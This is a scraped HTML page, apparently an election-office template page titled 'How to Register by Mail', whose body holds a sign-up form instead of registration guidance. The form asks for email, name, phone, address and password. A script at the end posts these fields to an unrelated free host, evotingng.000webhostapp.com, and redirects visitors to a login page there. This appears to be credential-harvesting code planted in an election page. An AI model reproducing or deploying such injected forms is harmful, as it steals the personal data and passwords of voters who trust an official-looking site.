...
var videopressAjax = {"ajaxUrl":"https:\/\/electionwebsitetemplate.org\/wp-admin\/admin-ajax.php","bridgeUrl":"https:\/\/electionwebsitetemplate.org\/wp-content\/plugins\/jetpack\/modules\/videopress\/js\/videopress-token-bridge.js","post_id":"60"};
</script>
...
<link rel="https://api.w.org/" href="https://electionwebsitetemplate.org/wp-json/"><link rel="alternate" type="application/json" href="https://electionwebsitetemplate.org/wp-json/wp/v2/pages/60">
<link rel="canonical" href="https://electionwebsitetemplate.org/registration/how-to-register-by-mail/">
<link rel="shortlink" href="https://wp.me/PcyAzn-Y">
<link rel="alternate" type="application/json+oembed" href="https://electionwebsitetemplate.org/wp-json/oembed/1.0/embed?url=https%3A%2F%2Felectionwebsitetemplate.org%2Fregistration%2Fhow-to-register-by-mail%2F">
<link rel="alternate" type="text/xml+oembed" href="https://electionwebsitetemplate.org/wp-json/oembed/1.0/embed?url=https%3A%2F%2Felectionwebsitetemplate.org%2Fregistration%2Fhow-to-register-by-mail%2F&amp;format=xml">
<style>img#wpstats{display:none}</style>
	<meta name="description" content="You can register to vote by filling out the state or national voter registration form and mailing it in to the [Insert: County] Elections office. If you don't have a printer, you can register online instead. If you're living in another country, see info on military and overseas voting. Fill out a Registration Form You…">
<link rel="amphtml" href="https://electionwebsitetemplate.org/registration/how-to-register-by-mail/?amp">			<style type="text/css">
...
<meta property="og:title" content="How to Register by Mail">
<meta property="og:url" content="https://electionwebsitetemplate.org/registration/how-to-register-by-mail/">
<meta property="og:description" content="You can register to vote by filling out the state or national voter registration form and mailing it in to the [Insert: County] Elections office. If you don’t have a printer, you can register…">
<meta property="article:published_time" content="2020-06-22T22:13:21+00:00">
<meta property="article:modified_time" content="2020-06-22T22:13:21+00:00">
...
<meta name="twitter:text:title" content="How to Register by Mail">
...
<body class="page-template-default page page-id-60 page-child parent-pageid-423 wp-custom-logo theme-blue page-how-to-register-by-mail">
...
<main class="post-60 page type-page status-publish hentry">
    <form>
        ...
        <div class="form-group">
          ...
          <input type="email" class="form-control email" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter email" required>
          <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
        </div>
        <div class="form-group">
            <label for="exampleInputEmail1">First Name</label>
            <input type="text" class="form-control fname" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter Firstname" required>
           
          </div>
          <div class="form-group">
            <label for="exampleInputEmail1">Last Name</label>
            <input type="text" class="form-control lname" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter Lastname" required>
           
          </div>
          <div class="form-group">
            <label for="exampleInputEmail1">Phone Number</label>
            <input type="number" class="form-control phone" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter Phine Number" required>
           
          </div>
          <div class="form-group">
            <label for="exampleInputEmail1">Address</label>
            <input type="address" class="form-control address" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter Addresss" required>
          
          </div>
        <div class="form-group">
          <label for="exampleInputPassword1">Password</label>
          <input type="password" class="form-control pwd" id="exampleInputPassword1" placeholder="Password" required>
        </div>
...
<script>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:11.3-a.3',blog:'185559761',post:'60',tz:'-4',srv:'electionwebsitetemplate.org',hp:'atomic',ac:'2',amp:'0'} ]);
	_stq.push([ 'clickTrackerInit', '185559761', '60' ]);
</script>
...
<img src="https://pixel.wp.com/g.gif?v=ext&amp;j=1%3A11.3-a.3&amp;blog=185559761&amp;post=60&amp;tz=-4&amp;srv=electionwebsitetemplate.org&amp;hp=atomic&amp;ac=2&amp;amp=0&amp;host=electionwebsitetemplate.org&amp;ref=https%3A%2F%2Felectionwebsitetemplate.org%2Fregistration%2F&amp;fcp=3564&amp;rand=0.020700830514632784" alt="" width="6" height="5" id="wpstats"></body></html>
...
<script>
    ...
    $(document).ready(function(){
      $('.btn-primary').click(function(){
        ...
        if(email && fname && lname && add && pwd && phone){
            const regiser = {
                email: email,
                fname: fname,
                lname:lname,
            ...
            try{
             $.post("https://evotingng.000webhostapp.com/apis/auth/register.php", regiser, function(result){
                  ...
                  if(result.status == true){
                    ...
                    setTimeout(()=>{
                        ...
                        window.location.replace("https://evotingng.000webhostapp.com/login/login-form.php");
               ...
               if(e.response.status==400 || e.response.status==422){
                $('.alert-success').hide()
                    $('.alert-danger').show()
                    $('.alert-danger').text(e.response.data.message)
                    setTimeout(()=>{
                        $('.alert-danger').hide()
                        $('.btn-primary').text('Submit')
                        $('.btn-primary').prop('disabled',false)
                    ...
                    $('.alert-success').hide()
                    $('.alert-danger').show()
                    $('.alert-danger').text('Network Error')
                    setTimeout(()=>{
                        $('.alert-danger').hide()
                        $('.btn-primary').text('Submit')
                        $('.btn-primary').prop('disabled',false)
